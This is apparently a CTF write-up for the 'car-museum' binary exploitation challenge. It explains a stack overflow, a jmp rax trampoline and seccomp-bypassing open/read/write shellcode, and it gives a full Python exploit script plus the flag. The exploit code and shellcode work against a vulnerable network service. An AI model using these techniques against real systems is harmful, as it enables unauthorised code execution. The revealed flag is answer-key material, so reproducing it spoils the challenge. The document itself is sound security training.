# car-museum — CTF Writeup

**Challenge Name:** car-museum  
**Category:** PWN (Binary Exploitation)  
**Points:** 500  
**Connection:** `nc 46.225.117.62 30014`  
**Flag:** `upCTF{c4tc4ll1ng_1s_n0t_c00l-evlbx4ka2ad216ce}`

---

## Table of Contents

1. [Challenge Description](#challenge-description)
2. [Reconnaissance](#reconnaissance)
3. [Binary Analysis](#binary-analysis)
4. [Vulnerabilities Found](#vulnerabilities-found)
5. [Exploitation Plan](#exploitation-plan)
6. [Step-by-Step Exploit Development](#step-by-step-exploit-development)
7. [Final Exploit Script](#final-exploit-script)
8. [Key Lessons Learned](#key-lessons-learned)

---

## Challenge Description

The challenge provides a 64-bit ELF binary called `car-museum` running on a remote server. When connected, it presents a menu-driven "cat museum":

```
                                   .__
  _____   ____  ______  _  __ ____ |  |   ____  ____   _____   ____
 /     \_/ __ \/  _ \ \/ \/ // __ \|  | _/ ___\/  _ \ /     \_/ __ \
|  Y Y  \  ___(  <_> )     /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/
|__|_|  /\___  >____/ \/\_/  \___  >____/\___  >____/|__|_|  /\___  >
      \/     \/                  \/          \/            \/     \/

============ MENU ============
| 1. Look at a cat           |
| 2. Add a new cat           |
| 3. Edit a cat description  |
| 4. Exit the museum         |
==============================
Choice:
```

The hint in the challenge description was: `I <3 cars`

---

## Reconnaissance

### File Analysis

```bash
file car-museum
# car-museum: ELF 64-bit LSB executable, x86-64, not stripped

checksec --file=car-museum
```

### Binary Protections

| Protection    | Status      | Consequence                              |
|---------------|-------------|------------------------------------------|
| PIE           | ❌ Disabled | All code addresses are fixed and known   |
| Stack Canary  | ❌ Disabled | Can overwrite return address freely      |
| NX / DEP      | ❌ Disabled | Stack memory is **executable** (RWE)     |
| Full RELRO    | ❌ Partial  | GOT entries are writable                 |
| ASLR          | ✅ Enabled  | Stack base address is randomized         |

The most important finding: **the stack is executable**. The `GNU_STACK` segment has `RWE` (Read-Write-Execute) flags, meaning shellcode placed on the stack will run.

```
GNU_STACK  RWE   <- stack is executable!
```

### Key Fixed Addresses (No PIE)

```
Binary base:    0x400000
puts@plt:       0x4010b0
printf@plt:     0x4010c0
fgets@plt:      0x4010d0
museum():       0x4013f8
main():         0x401892
jmp rax gadget: 0x40118c   <- crucial for exploit
```

---

## Binary Analysis

### Program Structure

The binary manages a list of "cats", each with a name (16 bytes) and description (64 bytes). Three cats are pre-populated at startup:

- Cat 0: `canuca` — description: `fofitxa`
- Cat 1: `farrusco` — description: `ganda gato mm es carece`
- Cat 2: `estagiario` — description: `acabou de entrar`

### Stack Layout in `museum()`

```
High addresses
┌─────────────────┐
│   saved rip     │  ← rbp + 0x08  (return to main)
├─────────────────┤
│   saved rbp     │  ← rbp + 0x00
├─────────────────┤
│   count (int)   │  ← rbp - 0x04  (number of cats, starts at 3)
├─────────────────┤
│   [gap 8 bytes] │  ← rbp - 0x0c  ← fgets writes HERE (review buffer)
├─────────────────┤
│                 │
│   cats array    │  ← rbp - 0x330 (10 cats × 0x50 bytes = 0x320 bytes)
│   (0x320 bytes) │
│                 │
├─────────────────┤
│   choice (int)  │  ← rbp - 0x334
├─────────────────┤
│   y/n char      │  ← rbp - 0x335
└─────────────────┘
Low addresses
```

### Cat Struct Layout

Each cat occupies `0x50` (80) bytes:

```
offset 0x00: name        (16 bytes)
offset 0x10: description (64 bytes)
```

So `cat[0].desc = rbp - 0x330 + 0x10 = rbp - 0x320`.

---

## Vulnerabilities Found

### Vulnerability 1 — Stack Buffer Overflow (Option 4 Review)

The critical vulnerability is in the "Exit" option (option 4). After asking to write a review, the binary calls:

```c
// Assembly at 0x401866:
fgets(rbp - 0x0c, 0x20, stdin);
```

This reads **32 bytes** (`0x20`) into a buffer that is only **12 bytes** before `rbp`. This overflows into:

- `rbp - 0x04` → count variable (bytes 8–11)
- `rbp + 0x00` → saved rbp (bytes 12–19)
- `rbp + 0x08` → **saved rip** (bytes 20–27) ← **return address control!**

### Vulnerability 2 — Forced Null Byte at buffer[7]

Immediately after `fgets`, the binary executes:

```asm
movb $0x0, -0x5(%rbp)   ; 0x40186b
```

This zeroes the byte at `rbp - 0x05`, which is `buffer[7]` (our overflow buffer start + 7). Any shellcode placed in the buffer must account for this.

### Key Insight — jmp rax Gadget

After `fgets` returns, the `rax` register holds the **buffer pointer** (`rbp - 0x0c`). The `leave; ret` sequence does not modify `rax`. So if we redirect `rip` to a `jmp rax` instruction, execution jumps directly to our buffer.

We found `jmp rax` at the fixed address `0x40118c`:
```
0x40118c: ff e0   jmp rax
```

---

## Exploitation Plan

### The Challenge: ASLR

With ASLR enabled, we do not know the stack address at runtime. We cannot hardcode the shellcode address. However:

- `rax` = `fgets()` return value = buffer address (determined at runtime)
- `jmp rax` gadget is at fixed address `0x40118c` (no PIE)

So: **overflow RIP → `jmp rax` → rax points to our buffer → shellcode executes**

### The Challenge: Small Buffer

The overflow buffer is only 20 bytes before the saved RIP. That is too small for a full Open/Read/Write shellcode.

**Solution: Two-stage shellcode**

- **Stage 1** (20 bytes in overflow buffer): A trampoline that jumps to `cat[0].desc`
- **Stage 2** (64 bytes in `cat[0].desc`): Full ORW shellcode to read `flag.txt`

### The Challenge: Byte[7] Forced Null

The binary zeroes `buffer[7]`. We handle this with a short jump:

```asm
byte[0-1]: eb 06     ; jmp +6 → lands at byte[8]
byte[2-6]: 90 90...  ; NOPs (skipped)
byte[7]:   ??        ; FORCED NULL — we jump over it, harmless
byte[8+]:  real shellcode
```

### The Challenge: execve is Blocked (Seccomp)

Initial attempts using `execve('/bin/sh')` shellcode failed silently. We diagnosed this by testing a `write()` syscall:

```python
# write(1, rax, 8) — prints 8 bytes of our buffer to stdout
test_sc = bytes([
    0x48, 0x89, 0xc6,             # mov rsi, rax
    0xbf, 0x01, 0x00, 0x00, 0x00, # mov edi, 1
    0xba, 0x08, 0x00, 0x00, 0x00, # mov edx, 8
    0x6a, 0x01, 0x58,             # push 1; pop rax (write=1)
    0x0f, 0x05,                   # syscall
    0x90, 0x90,
])
```

**Result:** We received our own buffer bytes back. Shellcode executes, `write()` works, but `execve()` is blocked by seccomp policy.

**Solution: Use Open/Read/Write (ORW) syscalls instead.**

---

## Step-by-Step Exploit Development

### Step 1 — Confirm Overflow Offset

We tested different padding sizes with `puts@plt` as the target RIP:

```python
for pad_size in [8, 10, 12, 14, 16, 18, 20]:
    test = b'A' * pad_size + struct.pack('<Q', PUTS_PLT)
    # send and check response
```

Result: `pad=20` produced a response (`\n` from puts). This confirmed:
- RIP is at **offset 20** from the buffer start
- The binary layout matches our local copy

### Step 2 — Build the Trampoline (Stage 1, 20 bytes)

```python
trampoline = bytes([
    0xeb, 0x06,                                # jmp +6 → land at byte[8]
    0x90, 0x90, 0x90, 0x90, 0x90,              # NOPs (bytes 2-6, skipped)
    0x90,                                      # byte[7]: forced to 0x00, harmless
    0x48, 0x8d, 0xb8, 0xec, 0xfc, 0xff, 0xff,  # lea rdi, [rax - 0x314]
    0xff, 0xe7,                                # jmp rdi
    0x90, 0x90, 0x90,                          # NOP padding to fill 20 bytes
])
```

Why `rax - 0x314`?
```
rax         = rbp - 0x0c      (fgets buffer)
cat[0].desc = rbp - 0x320     (cats base + 0x10)
rax - X     = cat[0].desc
(rbp-0x0c) - X = (rbp-0x320)
X = 0x320 - 0x0c = 0x314      ✓
```

### Step 3 — Build ORW Shellcode (Stage 2, fits in 64 bytes)

The shellcode is placed into `cat[0].desc` via option 3. When the trampoline calls `jmp rdi`, `rdi` points to the start of this shellcode.

```python
orw_code = bytes([
    # open("flag.txt", O_RDONLY)
    # rdi = start of this shellcode, add 40 to reach "flag.txt" string
    0x48, 0x83, 0xc7, 0x28,       # add rdi, 40
    0x48, 0x31, 0xf6,              # xor rsi, rsi  (O_RDONLY = 0)
    0x48, 0x31, 0xd2,              # xor rdx, rdx
    0x6a, 0x02, 0x58,              # push 2; pop rax  (open = 2)
    0x0f, 0x05,                    # syscall → rax = fd

    # read(fd, rsp-72, 100)
    0x48, 0x89, 0xc7,              # mov rdi, rax  (fd)
    0x48, 0x8d, 0x74, 0x24, 0xb8,  # lea rsi, [rsp-72]  (stack buffer)
    0x6a, 0x64, 0x5a,              # push 100; pop rdx
    0x48, 0x31, 0xc0,              # xor rax, rax  (read = 0)
    0x0f, 0x05,                    # syscall → rax = bytes read

    # write(1, rsp-72, bytes_read)
    0x48, 0x89, 0xc2,              # mov rdx, rax  (bytes read)
    0x6a, 0x01, 0x5f,              # push 1; pop rdi  (stdout)
    0x48, 0x8d, 0x74, 0x24, 0xb8,  # lea rsi, [rsp-72]  (same buffer)
    0x6a, 0x01, 0x58,              # push 1; pop rax  (write = 1)
    0x0f, 0x05,                    # syscall → flag printed!
]) + b'flag.txt\x00'               # "flag.txt" string at offset 40
```

### Step 4 — Avoid Bad Bytes

`fgets` stops reading on newline (`0x0a`). We must ensure no `0x0a` bytes appear in our shellcode. We also avoid `0x0d` (carriage return) which caused an early issue:

- Original shellcode used `add rdi, 13` = `48 83 c7 0d` → **`0x0d` is `\r`!** This corrupted the cat description write.
- Fixed by changing offset to 40 (`0x28`) which has no bad bytes.

### Step 5 — Send Everything with Correct Timing

A subtle issue: the menu `scanf("%d")` reads the choice and leaves `\n` in the buffer. Then `getchar()` consumes it. Then `scanf("%c")` reads the `y/n` answer. We must send them separately with delays:

```python
s.sendall(b'4\n')   # option 4
time.sleep(1.5)
recv(s)             # receive the review prompt

s.sendall(b'y\n')   # answer yes
time.sleep(1.5)
recv(s)             # receive "We appreciate you! Review: "

s.sendall(overflow + b'\n')  # send overflow payload
```

---

## Final Exploit Script

```python
#!/usr/bin/env python3
import socket, struct, time

HOST = '46.225.117.62'
PORT = 30014

def recv(s, t=2.0):
    s.settimeout(t)
    d = b''
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            d += c
    except: pass
    return d

JMP_RAX = 0x40118c  # jmp rax gadget at fixed address (no PIE)

# Stage 1: trampoline in overflow buffer (20 bytes)
trampoline = bytes([
    0xeb, 0x06,                                # jmp +6 (skip forced null at byte[7])
    0x90, 0x90, 0x90, 0x90, 0x90,              # NOPs
    0x90,                                      # byte[7] = forced 0x00 by binary
    0x48, 0x8d, 0xb8, 0xec, 0xfc, 0xff, 0xff,  # lea rdi, [rax-0x314] = cat[0].desc
    0xff, 0xe7,                                # jmp rdi
    0x90, 0x90, 0x90,                          # padding
])
overflow = trampoline + struct.pack('<Q', JMP_RAX)  # 28 bytes total

# Stage 2: ORW shellcode in cat[0].desc (fits in 64 bytes)
orw_code = bytes([
    0x48, 0x83, 0xc7, 0x28,       # add rdi, 40       (rdi -> "flag.txt")
    0x48, 0x31, 0xf6,              # xor rsi, rsi
    0x48, 0x31, 0xd2,              # xor rdx, rdx
    0x6a, 0x02, 0x58,              # push 2; pop rax   (open)
    0x0f, 0x05,                    # syscall
    0x48, 0x89, 0xc7,              # mov rdi, rax      (fd)
    0x48, 0x8d, 0x74, 0x24, 0xb8,  # lea rsi,[rsp-72]
    0x6a, 0x64, 0x5a,              # push 100; pop rdx
    0x48, 0x31, 0xc0,              # xor rax, rax      (read)
    0x0f, 0x05,                    # syscall
    0x48, 0x89, 0xc2,              # mov rdx, rax
    0x6a, 0x01, 0x5f,              # push 1; pop rdi   (stdout)
    0x48, 0x8d, 0x74, 0x24, 0xb8,  # lea rsi,[rsp-72]
    0x6a, 0x01, 0x58,              # push 1; pop rax   (write)
    0x0f, 0x05,                    # syscall
]) + b'flag.txt\x00'
cat_payload = orw_code + b'\x90' * (64 - len(orw_code))

with socket.socket() as s:
    s.connect((HOST, PORT))
    time.sleep(1.0)
    recv(s)

    # Step 1: plant ORW shellcode in cat[0].desc
    s.sendall(b'3\n'); time.sleep(1.0); recv(s)
    s.sendall(b'0\n'); time.sleep(1.0); recv(s)
    s.sendall(cat_payload[:63] + b'\n'); time.sleep(1.0); recv(s)

    # Step 2: trigger buffer overflow
    s.sendall(b'4\n'); time.sleep(1.5); recv(s)
    s.sendall(b'y\n'); time.sleep(1.5); recv(s)
    s.sendall(overflow + b'\n'); time.sleep(2.0)

    # Step 3: receive flag
    print(recv(s, t=3.0).decode(errors='replace'))
```

---

## Execution Flow Diagram

```
 NETWORK INPUT                   BINARY EXECUTION
 ─────────────                   ────────────────

 "3\n"          ──────────►  Option 3: Edit cat description
 "0\n"          ──────────►  Select cat[0]
 [ORW shellcode]──────────►  Write shellcode to cat[0].desc (stack)

 "4\n"          ──────────►  Option 4: Exit museum
 "y\n"          ──────────►  Yes to review
 [overflow]     ──────────►  fgets(rbp-0xc, 0x20)
                             └─ bytes[20:28] overwrites saved RIP
                             └─ saved RIP = 0x40118c (jmp rax)

                             leave; ret
                             └─ rip = 0x40118c

                             jmp rax
                             └─ rax = buffer address (fgets return)
                             └─ jump to trampoline in buffer

                             Trampoline executes:
                             └─ jmp over null at byte[7]
                             └─ lea rdi, [rax-0x314] = cat[0].desc
                             └─ jmp rdi

                             ORW shellcode executes:
                             └─ open("flag.txt", 0) → fd
                             └─ read(fd, stack_buf, 100) → flag bytes
                             └─ write(1, stack_buf, 100) → stdout

 FLAG RECEIVED  ◄──────────  upCTF{c4tc4ll1ng_1s_n0t_c00l-...}
```

---

## Key Lessons Learned

**1. Always check GNU_STACK flags**
The `RWE` flag on the stack means shellcode is executable — a huge advantage for exploitation.

**2. `fgets` is fine with null bytes**
Unlike `scanf` or `strcpy`, `fgets` reads binary data and only stops at newline (`0x0a`) or the size limit. This means null bytes in shellcode are fine.

**3. Watch out for `\r` (0x0d) in shellcode**
The byte `0x0d` is a carriage return. When sent over a network socket, it can cause `fgets` to behave unexpectedly. Always scan shellcode for bad bytes `[0x0a, 0x0d, 0x00]` when applicable.

**4. fgets return value in rax is a free pointer leak**
After `fgets(buf, size, stdin)` returns, `rax = buf`. If a `jmp rax` gadget exists in the binary, you can jump directly to your shellcode without any stack address leak.

**5. Test seccomp early**
When `execve` fails silently, test simpler syscalls like `write()` first. If `write()` works but `execve` doesn't, seccomp is likely filtering it. Switch to an ORW shellcode approach.

**6. Two-stage shellcode solves size constraints**
When the vulnerable buffer is too small for full shellcode, use it as a trampoline to a larger controlled area (like a heap allocation, BSS, or another stack buffer you control).

---

## Flag

```
upCTF{c4tc4ll1ng_1s_n0t_c00l-evlbx4ka2ad216ce}
```
